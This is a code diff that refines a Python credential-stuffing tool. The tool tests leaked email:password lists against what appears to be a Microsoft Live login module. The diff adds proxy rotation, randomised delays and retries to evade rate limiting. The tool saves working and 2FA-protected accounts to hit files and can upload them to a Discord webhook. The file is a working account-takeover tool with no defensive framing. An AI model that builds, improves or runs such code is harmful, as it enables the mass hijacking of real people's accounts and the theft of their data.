@@ -4,9 +4,11 @@ import yaml
 import requests
 import random
 import time
+import itertools
 from datetime import datetime, timezone
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from threading import Lock
+from threading import Lock, Semaphore
+from collections import deque
 from mailhub import LiveAuthenticator
 
 class Palette:
@@ -23,22 +25,22 @@ class Palette:
 printMutex = Lock()
 fileMutex = Lock()
 statsMutex = Lock()
+proxyMutex = Lock()
 
 CONFIG_DIR = "config"
 CONFIG_PATH = os.path.join(CONFIG_DIR, "config.yml")
 
 BASE_CONFIG = {
-    'threads': 200,
+    'threads': 50,
     'use_proxies': False,
-    'proxy_type': None,
-    'proxy_file': None,
-    'discord_webhook': False,
+    'proxy_type': 'http',
+    'proxy_file': 'proxies.txt',
+    'discord_webhook': None,
     'delay_enabled': True,
-    'delay_seconds': 0.7
+    'delay_seconds': 0.7,
+    'max_retries': 3,
+    'timeout': 30
 }
-
-def clearTerminal():
-    os.system('cls' if os.name == 'nt' else 'clear')
 
 def ensureConfigFolder():
     if not os.path.exists(CONFIG_DIR):
@@ -47,19 +49,24 @@ def ensureConfigFolder():
 def loadSettings():
     if os.path.exists(CONFIG_PATH):
         try:
-            with open(CONFIG_PATH, 'r') as f:
-                return yaml.safe_load(f) or BASE_CONFIG
+            with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
+                cfg = yaml.safe_load(f)
+                if cfg:
+                    for key in BASE_CONFIG:
+                        if key not in cfg:
+                            cfg[key] = BASE_CONFIG[key]
+                    return cfg
         except Exception:
-            return BASE_CONFIG.copy()
+            pass
     return BASE_CONFIG.copy()
 
 def saveSettings(cfg):
     ensureConfigFolder()
     try:
-        with open(CONFIG_PATH, 'w') as f:
-            yaml.dump(cfg, f, default_flow_style=False)
-    except Exception as e:
-        print(f"{Palette.RED}[ERROR] {str(e)}{Palette.RESET}")
+        with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
+            yaml.dump(cfg, f, default_flow_style=False, allow_unicode=True)
+    except Exception:
+        pass
 
 def sendToDiscord(webhook, validCount, twofaCount):
     if not webhook:
@@ -71,8 +78,8 @@ def sendToDiscord(webhook, validCount, twofaCount):
             with open('hits.txt', 'rb') as f:
                 filesData['hits.txt'] = f.read()
             embedsList.append({
-                "title": f"✓ {validCount} Valid Accounts",
-                "description": "File attached: hits.txt",
+                "title": f"VALID {validCount}",
+                "description": "hits.txt attached",
                 "color": 0x00FF00,
                 "timestamp": datetime.now(timezone.utc).isoformat()
             })
@@ -80,9 +87,9 @@ def sendToDiscord(webhook, validCount, twofaCount):
             with open('2fa.txt', 'rb') as f:
                 filesData['2fa.txt'] = f.read()
             embedsList.append({
-                "title": f"⚠️ {twofaCount} 2FA Accounts",
-                "description": "File attached: 2fa.txt",
-                "color": 0xFFFF00,
+                "title": f"2FA {twofaCount}",
+                "description": "2fa.txt attached",
+                "color": 0xFFA500,
                 "timestamp": datetime.now(timezone.utc).isoformat()
             })
         if embedsList:
@@ -95,176 +102,150 @@ def sendToDiscord(webhook, validCount, twofaCount):
 def loadProxyList(filename):
     try:
         with open(filename, 'r', encoding='utf-8') as f:
-            proxies = [line.strip() for line in f if line.strip()]
-        return proxies
+            proxies = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
+        unique_proxies = []
+        seen = set()
+        for p in proxies:
+            if p not in seen:
+                seen.add(p)
+                unique_proxies.append(p)
+        return unique_proxies
     except FileNotFoundError:
-        print(f"{Palette.RED}[ERROR] Proxy file '{filename}' not found!{Palette.RESET}")
+        print(f"{Palette.RED}[ERROR] Proxy file '{filename}' not found{Palette.RESET}")
         return []
     except Exception as e:
         print(f"{Palette.RED}[ERROR] {str(e)}{Palette.RESET}")
         return []
 
-def configureSettings(cfg):
-    print(f"\n{Palette.CYAN}╭─ {Palette.BOLD}Proxy Settings{Palette.RESET}")
-    print(f"{Palette.CYAN}│{Palette.RESET} {Palette.MAGENTA}[Config]{Palette.RESET} Use proxies? {Palette.YELLOW}y/n{Palette.RESET}")
-    useProxy = input(f"{Palette.CYAN}╰─>{Palette.RESET} ").strip().lower()
-    cfg['use_proxies'] = (useProxy == 'y')
+class ProxyRotator:
+    def __init__(self, proxies, proxy_type):
+        self.proxies = deque(proxies)
+        self.proxy_type = proxy_type
+        self.lock = Lock()
     
+    def get_proxy(self):
+        with self.lock:
+            if not self.proxies:
+                return None
+            proxy_addr = self.proxies[0]
+            self.proxies.rotate(1)
+            clean_addr = proxy_addr.split('://', 1)[1] if '://' in proxy_addr else proxy_addr
+            if self.proxy_type == 'socks5':
+                scheme = 'socks5'
+            elif self.proxy_type == 'socks4':
+                scheme = 'socks4'
+            else:
+                scheme = 'http'
+            return {
+                'http': f'{scheme}://{clean_addr}',
+                'https': f'{scheme}://{clean_addr}'
+            }
+
+def configureSettings(cfg):
+    print(f"\n{Palette.CYAN}╭─ PROXY SETTINGS{Palette.RESET}")
+    useProxy = input(f"{Palette.CYAN}╰─> Use proxies? (y/n): {Palette.RESET}").strip().lower()
+    cfg['use_proxies'] = (useProxy == 'y')
     if cfg['use_proxies']:
-        print(f"\n{Palette.CYAN}╭─ {Palette.BOLD}Proxy Type{Palette.RESET}")
-        print(f"{Palette.CYAN}│{Palette.RESET} {Palette.MAGENTA}[Config]{Palette.RESET} Type (http/https/socks4/socks5){Palette.RESET}")
-        ptype = input(f"{Palette.CYAN}╰─>{Palette.RESET} ").strip().lower()
-        if ptype not in ['http', 'https', 'socks4', 'socks5']:
-            print(f"{Palette.YELLOW}[!] Invalid, defaulting to http{Palette.RESET}")
-            ptype = 'http'
-        print(f"\n{Palette.CYAN}╭─ {Palette.BOLD}Proxy File{Palette.RESET}")
-        print(f"{Palette.CYAN}│{Palette.RESET} {Palette.MAGENTA}[Config]{Palette.RESET} File name (e.g., proxies.txt){Palette.RESET}")
-        pfile = input(f"{Palette.CYAN}╰─>{Palette.RESET} ").strip()
-        if pfile:
+        print(f"\n{Palette.CYAN}╭─ PROXY TYPE{Palette.RESET}")
+        ptype = input(f"{Palette.CYAN}╰─> http/https/socks4/socks5: {Palette.RESET}").strip().lower()
+        if ptype in ['http', 'https', 'socks4', 'socks5']:
             cfg['proxy_type'] = ptype
+        else:
+            print(f"{Palette.YELLOW}[!] Invalid, using http{Palette.RESET}")
+            cfg['proxy_type'] = 'http'
+        print(f"\n{Palette.CYAN}╭─ PROXY FILE{Palette.RESET}")
+        pfile = input(f"{Palette.CYAN}╰─> Filename (default: proxies.txt): {Palette.RESET}").strip()
+        if pfile:
             cfg['proxy_file'] = pfile
         else:
-            cfg['use_proxies'] = False
-            cfg['proxy_type'] = None
-            cfg['proxy_file'] = None
+            cfg['proxy_file'] = 'proxies.txt'
     else:
-        cfg['proxy_type'] = None
-        cfg['proxy_file'] = None
-    
-    print(f"\n{Palette.CYAN}╭─ {Palette.BOLD}Thread Settings{Palette.RESET}")
-    print(f"{Palette.CYAN}│{Palette.RESET} {Palette.MAGENTA}[Config]{Palette.RESET} Thread count (max 500){Palette.RESET}")
-    thrInput = input(f"{Palette.CYAN}╰─>{Palette.RESET} ").strip()
-    try:
-        thr = int(thrInput)
-        cfg['threads'] = max(1, min(thr, 500))
-    except ValueError:
-        print(f"{Palette.YELLOW}[!] Invalid, keeping current{Palette.RESET}")
-    
-    print(f"\n{Palette.CYAN}╭─ {Palette.BOLD}Rate Limiting (Delay){Palette.RESET}")
-    print(f"{Palette.CYAN}│{Palette.RESET} {Palette.MAGENTA}[Config]{Palette.RESET} Enable delay between requests? {Palette.YELLOW}y/n{Palette.RESET}")
-    delayChoice = input(f"{Palette.CYAN}╰─>{Palette.RESET} ").strip().lower()
+        cfg['proxy_type'] = 'http'
+        cfg['proxy_file'] = 'proxies.txt'
+    print(f"\n{Palette.CYAN}╭─ THREAD SETTINGS{Palette.RESET}")
+    thrInput = input(f"{Palette.CYAN}╰─> Thread count (1-200, default 50): {Palette.RESET}").strip()
+    if thrInput:
+        try:
+            thr = int(thrInput)
+            cfg['threads'] = max(1, min(thr, 200))
+        except ValueError:
+            print(f"{Palette.YELLOW}[!] Invalid, keeping {cfg['threads']}{Palette.RESET}")
+    print(f"\n{Palette.CYAN}╭─ DELAY SETTINGS{Palette.RESET}")
+    delayChoice = input(f"{Palette.CYAN}╰─> Enable delay? (y/n): {Palette.RESET}").strip().lower()
     cfg['delay_enabled'] = (delayChoice == 'y')
     if cfg['delay_enabled']:
-        print(f"{Palette.CYAN}╭─ {Palette.BOLD}Delay Seconds{Palette.RESET}")
-        print(f"{Palette.CYAN}│{Palette.RESET} {Palette.MAGENTA}[Config]{Palette.RESET} Seconds between requests (0.3 - 1.5){Palette.RESET}")
-        secInput = input(f"{Palette.CYAN}╰─>{Palette.RESET} ").strip()
-        try:
-            sec = float(secInput)
-            cfg['delay_seconds'] = max(0.3, min(sec, 1.5))
-        except:
-            cfg['delay_seconds'] = 0.7
-    
-    print(f"\n{Palette.CYAN}╭─ {Palette.BOLD}Discord Webhook{Palette.RESET}")
-    print(f"{Palette.CYAN}│{Palette.RESET} {Palette.MAGENTA}[Config]{Palette.RESET} Use Discord webhook? {Palette.YELLOW}y/n{Palette.RESET}")
-    webhookChoice = input(f"{Palette.CYAN}╰─>{Palette.RESET} ").strip().lower()
+        secInput = input(f"{Palette.CYAN}╰─> Delay seconds (0.3-1.5, default 0.7): {Palette.RESET}").strip()
+        if secInput:
+            try:
+                sec = float(secInput)
+                cfg['delay_seconds'] = max(0.3, min(sec, 1.5))
+            except ValueError:
+                cfg['delay_seconds'] = 0.7
+    print(f"\n{Palette.CYAN}╭─ DISCORD WEBHOOK{Palette.RESET}")
+    webhookChoice = input(f"{Palette.CYAN}╰─> Enable Discord webhook? (y/n): {Palette.RESET}").strip().lower()
     if webhookChoice == 'y':
-        print(f"{Palette.CYAN}╭─ {Palette.BOLD}Discord Webhook{Palette.RESET}")
-        print(f"{Palette.CYAN}│{Palette.RESET} {Palette.MAGENTA}[Config]{Palette.RESET} Enter webhook URL{Palette.RESET}")
-        whUrl = input(f"{Palette.CYAN}╰─>{Palette.RESET} ").strip()
+        whUrl = input(f"{Palette.CYAN}╰─> Webhook URL: {Palette.RESET}").strip()
         cfg['discord_webhook'] = whUrl if whUrl else None
     else:
         cfg['discord_webhook'] = None
-    
     saveSettings(cfg)
-    print(f"\n{Palette.GREEN}[✓] Configuration saved!{Palette.RESET}")
+    print(f"\n{Palette.GREEN}[✓] Configuration saved{Palette.RESET}")
     time.sleep(1)
     return cfg
 
 def showConfig(cfg):
-    threadsLine = f"Threads: {cfg['threads']}"
-    proxyStat = "Yes" if cfg['use_proxies'] else "No"
-    proxyLine = f"Use Proxies: {proxyStat}"
-    delayStat = "Enabled" if cfg.get('delay_enabled') else "Disabled"
-    delayLine = f"Delay: {delayStat}"
-    if cfg.get('delay_enabled'):
-        delayLine += f" ({cfg.get('delay_seconds', 0.7)}s)"
-    webhookStat = "Enabled" if cfg.get('discord_webhook') else "Disabled"
-    webhookLine = f"Discord Webhook: {webhookStat}"
-    
-    maxLen = max(len("Current Configuration:"), len(threadsLine), len(proxyLine), len(delayLine), len(webhookLine))
-    if cfg['use_proxies'] and cfg.get('proxy_file'):
-        ptypeLine = f"Proxy Type: {cfg.get('proxy_type', 'http')}"
-        pfileLine = f"Proxy File: {cfg.get('proxy_file', 'N/A')}"
-        maxLen = max(maxLen, len(ptypeLine), len(pfileLine))
-    boxW = maxLen + 4
-    
-    print(f"\n{Palette.CYAN}╔{'═' * boxW}╗{Palette.RESET}")
-    title = "Current Configuration:"
-    titlePad = boxW - len(title) - 2
-    print(f"{Palette.CYAN}║{Palette.RESET} {Palette.MAGENTA}{Palette.BOLD}{title}{Palette.RESET}{' ' * titlePad} {Palette.CYAN}║{Palette.RESET}")
-    print(f"{Palette.CYAN}╠{'═' * boxW}╣{Palette.RESET}")
-    
-    thrCol = Palette.GREEN
-    thrText = f"Threads: {thrCol}{cfg['threads']}{Palette.RESET}"
-    thrPad = boxW - len(threadsLine) - 2
-    print(f"{Palette.CYAN}║{Palette.RESET} {thrText}{' ' * thrPad} {Palette.CYAN}║{Palette.RESET}")
-    
-    proxyColor = Palette.GREEN if cfg['use_proxies'] else Palette.RED
-    proxyText = f"Use Proxies: {proxyColor}{proxyStat}{Palette.RESET}"
-    proxyPad = boxW - len(proxyLine) - 2
-    print(f"{Palette.CYAN}║{Palette.RESET} {proxyText}{' ' * proxyPad} {Palette.CYAN}║{Palette.RESET}")
-    
-    delayColor = Palette.GREEN if cfg.get('delay_enabled') else Palette.RED
-    delayText = f"Delay: {delayColor}{delayStat}{Palette.RESET}"
-    if cfg.get('delay_enabled'):
-        delayText += f" ({cfg.get('delay_seconds', 0.7)}s)"
-    delayPad = boxW - len(delayLine) - 2
-    print(f"{Palette.CYAN}║{Palette.RESET} {delayText}{' ' * delayPad} {Palette.CYAN}║{Palette.RESET}")
-    
-    if cfg['use_proxies'] and cfg.get('proxy_file'):
-        ptypeCol = Palette.YELLOW
-        ptypeText = f"Proxy Type: {ptypeCol}{cfg.get('proxy_type', 'http')}{Palette.RESET}"
-        ptypePad = boxW - len(ptypeLine) - 2
-        print(f"{Palette.CYAN}║{Palette.RESET} {ptypeText}{' ' * ptypePad} {Palette.CYAN}║{Palette.RESET}")
-        pfileCol = Palette.YELLOW
-        pfileText = f"Proxy File: {pfileCol}{cfg.get('proxy_file', 'N/A')}{Palette.RESET}"
-        pfilePad = boxW - len(pfileLine) - 2
-        print(f"{Palette.CYAN}║{Palette.RESET} {pfileText}{' ' * pfilePad} {Palette.CYAN}║{Palette.RESET}")
-    
-    webhookColor = Palette.GREEN if cfg.get('discord_webhook') else Palette.RED
-    webhookText = f"Discord Webhook: {webhookColor}{webhookStat}{Palette.RESET}"
-    webhookPad = boxW - len(webhookLine) - 2
-    print(f"{Palette.CYAN}║{Palette.RESET} {webhookText}{' ' * webhookPad} {Palette.CYAN}║{Palette.RESET}")
-    print(f"{Palette.CYAN}╚{'═' * boxW}╝{Palette.RESET}")
+    print(f"\n{Palette.CYAN}╔{'═' * 42}╗{Palette.RESET}")
+    print(f"{Palette.CYAN}║{Palette.RESET} {Palette.MAGENTA}{Palette.BOLD}CURRENT CONFIGURATION{Palette.RESET}{' ' * 18}{Palette.CYAN}║{Palette.RESET}")
+    print(f"{Palette.CYAN}╠{'═' * 42}╣{Palette.RESET}")
+    print(f"{Palette.CYAN}║{Palette.RESET} Threads: {Palette.GREEN}{cfg['threads']}{Palette.RESET}{' ' * (31 - len(str(cfg['threads'])))} {Palette.CYAN}║{Palette.RESET}")
+    proxy_stat = "Yes" if cfg['use_proxies'] else "No"
+    proxy_color = Palette.GREEN if cfg['use_proxies'] else Palette.RED
+    print(f"{Palette.CYAN}║{Palette.RESET} Proxies: {proxy_color}{proxy_stat}{Palette.RESET}{' ' * (31 - len(proxy_stat))} {Palette.CYAN}║{Palette.RESET}")
+    if cfg['use_proxies']:
+        print(f"{Palette.CYAN}║{Palette.RESET} Proxy Type: {Palette.YELLOW}{cfg['proxy_type']}{Palette.RESET}{' ' * (26 - len(cfg['proxy_type']))} {Palette.CYAN}║{Palette.RESET}")
+    delay_stat = "Yes" if cfg['delay_enabled'] else "No"
+    delay_color = Palette.GREEN if cfg['delay_enabled'] else Palette.RED
+    print(f"{Palette.CYAN}║{Palette.RESET} Delay: {delay_color}{delay_stat}{Palette.RESET}{' ' * (33 - len(delay_stat))} {Palette.CYAN}║{Palette.RESET}")
+    if cfg['delay_enabled']:
+        print(f"{Palette.CYAN}║{Palette.RESET} Delay Sec: {Palette.YELLOW}{cfg['delay_seconds']}{Palette.RESET}{' ' * (28 - len(str(cfg['delay_seconds'])))} {Palette.CYAN}║{Palette.RESET}")
+    webhook_stat = "Yes" if cfg['discord_webhook'] else "No"
+    webhook_color = Palette.GREEN if cfg['discord_webhook'] else Palette.RED
+    print(f"{Palette.CYAN}║{Palette.RESET} Discord: {webhook_color}{webhook_stat}{Palette.RESET}{' ' * (31 - len(webhook_stat))} {Palette.CYAN}║{Palette.RESET}")
+    print(f"{Palette.CYAN}╚{'═' * 42}╝{Palette.RESET}")
 
 def isValidPair(line):
     line = line.strip()
     if not line:
-        return False
-    spamSigns = ['telegram', 't.me', 'discord', 'http://', 'https://', '___By@', 'C--l--o--u--d', '!!!', 'H--O--T--M--A--I--L', '(ow)z', 'BACK_UP', '##', '@@', '__', '--']
-    if any(s.lower() in line.lower() for s in spamSigns):
         return False
     if line.count(':') != 1:
         return False
     parts = line.split(':', 1)
     if len(parts) != 2:
         return False
-    mail, pwd = parts
-    mail = mail.strip()
-    pwd = pwd.strip()
-    if '@' not in mail or len(mail) < 3:
+    mail, pwd = parts[0].strip(), parts[1].strip()
+    if '@' not in mail or len(mail) < 5:
         return False
     if not pwd or len(pwd) < 1:
         return False
-    validChars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@._-+')
-    if not all(c in validChars for c in mail):
+    spam_signs = ['telegram', 't.me', 'discord', 'http://', 'https://', '___', '!!!', '##', '@@', '__']
+    if any(s.lower() in line.lower() for s in spam_signs):
         return False
     return True
 
 def loadCombinations(filename):
     try:
         with open(filename, 'r', encoding='utf-8') as f:
-            allLines = [line.strip() for line in f if line.strip()]
-        validLines = [line for line in allLines if isValidPair(line)]
+            all_lines = [line.strip() for line in f if line.strip()]
+        valid_lines = [line for line in all_lines if isValidPair(line)]
         seen = set()
-        unique = []
-        for line in validLines:
+        unique_lines = []
+        for line in valid_lines:
             if line not in seen:
                 seen.add(line)
-                unique.append(line)
-        return unique
+                unique_lines.append(line)
+        return unique_lines
     except FileNotFoundError:
-        print(f"{Palette.RED}[ERROR] '{filename}' not found!{Palette.RESET}")
+        print(f"{Palette.RED}[ERROR] '{filename}' not found{Palette.RESET}")
         with open(filename, 'w', encoding='utf-8') as f:
             f.write("")
         return []
@@ -273,17 +254,20 @@ def loadCombinations(filename):
         return []
 
 def loadAlreadyChecked():
-    checkedEmails = set()
-    resultFiles = ['hits.txt', '2fa.txt', 'invalid.txt']
-    for fname in resultFiles:
+    checked_emails = set()
+    result_files = ['hits.txt', '2fa.txt', 'invalid.txt']
+    for fname in result_files:
         if os.path.exists(fname):
-            with open(fname, 'r', encoding='utf-8') as f:
-                for line in f:
-                    line = line.strip()
-                    if ':' in line:
-                        email = line.split(':', 1)[0]
-                        checkedEmails.add(email)
-    return checkedEmails
+            try:
+                with open(fname, 'r', encoding='utf-8') as f:
+                    for line in f:
+                        line = line.strip()
+                        if ':' in line:
+                            email = line.split(':', 1)[0]
+                            checked_emails.add(email)
+            except Exception:
+                continue
+    return checked_emails
 
 def saveResult(filename, content):
     try:
@@ -294,10 +278,10 @@ def saveResult(filename, content):
     except Exception:
         return False
 
-def examineAccount(authenticator, email, password, proxySettings, maxRetries=3):
-    for attempt in range(maxRetries):
+def examineAccount(authenticator, email, password, proxy_config, max_retries):
+    for attempt in range(max_retries):
         try:
-            outcome = authenticator.authenticate(email, password, proxySettings)
+            outcome = authenticator.authenticate(email, password, proxy_config)
             if outcome[0] != "retry":
                 if outcome[0] == "ok":
                     return "VALID", outcome[1] if len(outcome) > 1 else None
@@ -307,12 +291,12 @@ def examineAccount(authenticator, email, password, proxySettings, maxRetries=3):
                     return "INVALID", None
                 else:
                     return "INVALID", None
-            if attempt < maxRetries - 1:
-                time.sleep(1)
+            if attempt < max_retries - 1:
+                time.sleep(random.uniform(1.0, 2.0))
         except Exception:
-            if attempt == maxRetries - 1:
+            if attempt == max_retries - 1:
                 return "INVALID", None
-            time.sleep(1)
+            time.sleep(random.uniform(1.0, 2.0))
     return "INVALID", None
 
 def showBanner():
@@ -346,26 +330,13 @@ def logOutput(status, combo):
         with printMutex:
             print(f"{Palette.RED}[{timestamp}] INVALID: {combo}{Palette.RESET}")
 
-def handleCredential(combo, proxyPool, proxyType, idx, total, stats, delayEnabled, delaySec):
+def handleCredential(combo, rotator, idx, total, stats, delay_enabled, delay_sec, max_retries):
     authenticator = None
     try:
         email, password = combo.split(':', 1)
         authenticator = LiveAuthenticator()
-        proxyDict = None
-        if proxyPool:
-            proxyAddr = random.choice(proxyPool)
-            cleanAddr = proxyAddr.split('://', 1)[1] if '://' in proxyAddr else proxyAddr
-            if proxyType == 'socks5':
-                scheme = 'socks5'
-            elif proxyType == 'socks4':
-                scheme = 'socks4'
-            else:
-                scheme = 'http'
-            proxyDict = {
-                'http': f'{scheme}://{cleanAddr}',
-                'https': f'{scheme}://{cleanAddr}'
-            }
-        status, extra = examineAccount(authenticator, email, password, proxyDict, maxRetries=3)
+        proxy_config = rotator.get_proxy() if rotator else None
+        status, extra = examineAccount(authenticator, email, password, proxy_config, max_retries)
         with statsMutex:
             stats['checked'] += 1
             if status == "VALID":
@@ -380,8 +351,12 @@ def handleCredential(combo, proxyPool, proxyType, idx, total, stats, delayEnable
                 stats['invalid'] += 1
                 saveResult('invalid.txt', combo)
                 logOutput("INVALID", combo)
-        if delayEnabled:
-            time.sleep(random.uniform(delaySec - 0.2, delaySec + 0.2))
+            remaining = stats['total'] - stats['checked']
+            if remaining % 10 == 0 or remaining < 5:
+                print(f"{Palette.CYAN}[PROGRESS] {stats['checked']}/{stats['total']} | VALID:{stats['valid']} 2FA:{stats['2fa']}{Palette.RESET}")
+        if delay_enabled:
+            jitter = random.uniform(delay_sec * 0.8, delay_sec * 1.2)
+            time.sleep(jitter)
     except Exception:
         with statsMutex:
             stats['invalid'] += 1
@@ -391,22 +366,23 @@ def handleCredential(combo, proxyPool, proxyType, idx, total, stats, delayEnable
 
 def generateReport(stats, startTime, cfg):
     elapsed = time.time() - startTime
-    successRate = (stats['valid'] / stats['total'] * 100) if stats['total'] > 0 else 0
+    success_rate = (stats['valid'] / stats['total'] * 100) if stats['total'] > 0 else 0
+    speed = stats['total'] / elapsed if elapsed > 0 else 0
     report = f"""
-╔══════════════════════════════════════════════════════════╗
-║                     CHECK REPORT                         ║
-╠══════════════════════════════════════════════════════════╣
+╔══════════════════════════════════════════════════════════════╗
+║                      CHECK REPORT                            ║
+╠══════════════════════════════════════════════════════════════╣
 ║ Total Accounts:      {stats['total']}
 ║ Valid (No 2FA):      {stats['valid']}
 ║ 2FA Required:        {stats['2fa']}
 ║ Invalid/Failed:      {stats['invalid']}
-║ Success Rate:        {successRate:.2f}%
+║ Success Rate:        {success_rate:.2f}%
 ║ Time Elapsed:        {elapsed:.2f} seconds
-║ Speed:               {stats['total']/elapsed:.2f} acc/sec
+║ Speed:               {speed:.2f} acc/sec
 ║ Threads Used:        {cfg['threads']}
 ║ Proxies Used:        {'Yes' if cfg['use_proxies'] else 'No'}
-║ Delay Enabled:       {'Yes' if cfg.get('delay_enabled') else 'No'}
-╚══════════════════════════════════════════════════════════╝
+║ Delay Enabled:       {'Yes' if cfg['delay_enabled'] else 'No'}
+╚══════════════════════════════════════════════════════════════╝
 """
     with open('report.txt', 'w', encoding='utf-8') as f:
         f.write(report)
@@ -418,64 +394,64 @@ def runChecker():
     ensureConfigFolder()
     config = loadSettings()
     showConfig(config)
-    print(f"\n{Palette.CYAN}╭─ {Palette.BOLD}Configuration{Palette.RESET}")
-    happy = input(f"{Palette.CYAN}│{Palette.RESET} Happy with config? {Palette.GREEN}(y to start, n to edit){Palette.RESET}\n{Palette.CYAN}╰─>{Palette.RESET} ").strip().lower()
+    print(f"\n{Palette.CYAN}╭─ CONFIGURATION{Palette.RESET}")
+    happy = input(f"{Palette.CYAN}╰─> Happy with config? (y to start, n to edit): {Palette.RESET}").strip().lower()
     if happy == 'n':
         config = configureSettings(config)
         clearTerminal()
         showBanner()
         showConfig(config)
-    comboFile = "combos.txt"
-    allCombos = loadCombinations(comboFile)
-    if not allCombos:
-        print(f"\n{Palette.RED}[✗] No valid combos found in combos.txt{Palette.RESET}")
+    combo_file = "combos.txt"
+    all_combos = loadCombinations(combo_file)
+    if not all_combos:
+        print(f"\n{Palette.RED}[ERROR] No valid combos found in combos.txt{Palette.RESET}")
         input(f"\n{Palette.WHITE}Press Enter to exit...{Palette.RESET}")
         return
-    alreadyCheckedEmails = loadAlreadyChecked()
-    originalCount = len(allCombos)
-    freshCombos = []
-    for combo in allCombos:
+    checked_emails = loadAlreadyChecked()
+    original_count = len(all_combos)
+    fresh_combos = []
+    for combo in all_combos:
         email = combo.split(':', 1)[0]
-        if email not in alreadyCheckedEmails:
-            freshCombos.append(combo)
-    skipped = originalCount - len(freshCombos)
-    print(f"\n{Palette.GREEN}[✓] Loaded {originalCount} combos, {skipped} already checked (skipped){Palette.RESET}")
-    print(f"{Palette.GREEN}[✓] Fresh combos to check: {len(freshCombos)}{Palette.RESET}")
-    proxyList = []
+        if email not in checked_emails:
+            fresh_combos.append(combo)
+    skipped = original_count - len(fresh_combos)
+    print(f"\n{Palette.GREEN}[✓] Loaded {original_count} combos, {skipped} skipped (already checked){Palette.RESET}")
+    print(f"{Palette.GREEN}[✓] Fresh combos to check: {len(fresh_combos)}{Palette.RESET}")
+    rotator = None
     if config['use_proxies'] and config.get('proxy_file'):
-        proxyList = loadProxyList(config.get('proxy_file'))
-        if proxyList:
-            print(f"{Palette.GREEN}[✓] Loaded {len(proxyList)} proxies{Palette.RESET}")
+        proxy_list = loadProxyList(config['proxy_file'])
+        if proxy_list:
+            print(f"{Palette.GREEN}[✓] Loaded {len(proxy_list)} proxies{Palette.RESET}")
             if config['threads'] > 100:
                 print(f"{Palette.YELLOW}[!] Reducing threads to 100 for proxy stability{Palette.RESET}")
                 config['threads'] = 100
+            rotator = ProxyRotator(proxy_list, config['proxy_type'])
         else:
             print(f"{Palette.YELLOW}[!] No proxies loaded, continuing without proxies{Palette.RESET}")
             config['use_proxies'] = False
     print()
-    webhookUrl = config.get('discord_webhook')
     stats = {
-        'total': len(freshCombos),
+        'total': len(fresh_combos),
         'checked': 0,
         'valid': 0,
         '2fa': 0,
         'invalid': 0
     }
-    startTime = time.time()
+    start_time = time.time()
     try:
         with ThreadPoolExecutor(max_workers=config['threads']) as executor:
             futures = []
-            for i, combo in enumerate(freshCombos, 1):
+            for i, combo in enumerate(fresh_combos, 1):
                 future = executor.submit(
                     handleCredential,
                     combo,
-                    proxyList,
-                    config.get('proxy_type', 'http'),
+                    rotator,
                     i,
                     stats['total'],
                     stats,
-                    config.get('delay_enabled', True),
-                    config.get('delay_seconds', 0.7)
+                    config['delay_enabled'],
+                    config['delay_seconds'],
+                    config['max_retries']
                 )
                 futures.append(future)
             for future in as_completed(futures):
@@ -485,18 +461,21 @@ def runChecker():
                     pass
     except KeyboardInterrupt:
         print(f"\n\n{Palette.YELLOW}[!] Stopped by user{Palette.RESET}")
-    print(f"\n\n{Palette.GREEN}{Palette.BOLD}✓ CHECKING COMPLETE!{Palette.RESET}\n")
+    print(f"\n\n{Palette.GREEN}{Palette.BOLD}CHECKING COMPLETE{Palette.RESET}\n")
     if stats['valid'] > 0:
         print(f"{Palette.GREEN}[✓] {stats['valid']} Valid accounts saved to: hits.txt{Palette.RESET}")
     if stats['2fa'] > 0:
         print(f"{Palette.YELLOW}[✓] {stats['2fa']} 2FA accounts saved to: 2fa.txt{Palette.RESET}")
     if stats['invalid'] > 0:
         print(f"{Palette.RED}[✓] {stats['invalid']} Invalid accounts saved to: invalid.txt{Palette.RESET}")
-    generateReport(stats, startTime, config)
-    if webhookUrl and (stats['valid'] > 0 or stats['2fa'] > 0):
-        print(f"\n{Palette.CYAN}[✓] Sending to Discord...{Palette.RESET}")
-        sendToDiscord(webhookUrl, stats['valid'], stats['2fa'])
+    generateReport(stats, start_time, config)
+    if config['discord_webhook'] and (stats['valid'] > 0 or stats['2fa'] > 0):
+        print(f"\n{Palette.CYAN}[✓] Sending results to Discord{Palette.RESET}")
+        sendToDiscord(config['discord_webhook'], stats['valid'], stats['2fa'])
     input(f"\n{Palette.WHITE}Press Enter to exit...{Palette.RESET}")
+
+def clearTerminal():
+    os.system('cls' if os.name == 'nt' else 'clear')
 
 if __name__ == "__main__":
     try:
